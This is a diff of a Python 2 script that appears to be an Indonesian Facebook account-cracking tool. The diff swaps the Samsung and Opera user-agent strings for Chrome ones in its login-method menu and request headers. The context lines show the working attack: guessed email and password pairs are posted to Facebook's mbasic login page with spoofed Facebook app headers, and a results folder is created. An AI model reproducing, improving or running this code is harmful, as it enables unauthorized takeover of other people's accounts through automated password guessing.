@@ -636,8 +636,8 @@ class __crack__:
                             moch_yayan()
                     print ' %s=================================================='%(N)
                     print ' %s[%s?%s] Pilih Method login Anda. Silahkan coba satu²'%(N,K,N)
-                    print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat Via UA Samsung%s)'%(N,H,N,O,N,H,N)
-                    print ' %s[%s2%s] Method %smbasic %s(%sProses Normal Via UA Opera%s)'%(N,H,N,O,N,K,N)
+                    print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat Via UA Chrome%s)'%(N,H,N,O,N,H,N)
+                    print ' %s[%s2%s] Method %smbasic %s(%sProses Normal Via UA Chrome%s)'%(N,H,N,O,N,K,N)
                     print ' %s[%s3%s] Method %smobile %s(%sProses Lama Via UA Chrome%s)'%(N,H,N,O,N,M,N)
                     __yan__(pwek.split(','))
                     break
@@ -645,8 +645,8 @@ class __crack__:
         elif ___yayanganteng___ in ('T', 't'):
             print ' %s=================================================='%(N)
             print ' %s[%s?%s] Pilih Method login Anda. Silahkan coba satu²'%(N,K,N)
-            print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat Via UA Samsung%s)'%(N,H,N,O,N,H,N)
-            print ' %s[%s2%s] Method %smbasic %s(%sProses Normal Via UA Opera%s)'%(N,H,N,O,N,K,N)
+            print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat Via UA Chrome%s)'%(N,H,N,O,N,H,N)
+            print ' %s[%s2%s] Method %smbasic %s(%sProses Normal Via UA Chrome%s)'%(N,H,N,O,N,K,N)
             print ' %s[%s3%s] Method %smobile %s(%sProses Lama Via UA Chrome%s)'%(N,H,N,O,N,M,N)
             self.__pler__()
         else:
@@ -701,7 +701,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-	    user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 OPR/60.3.3004.55692'
+	    user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
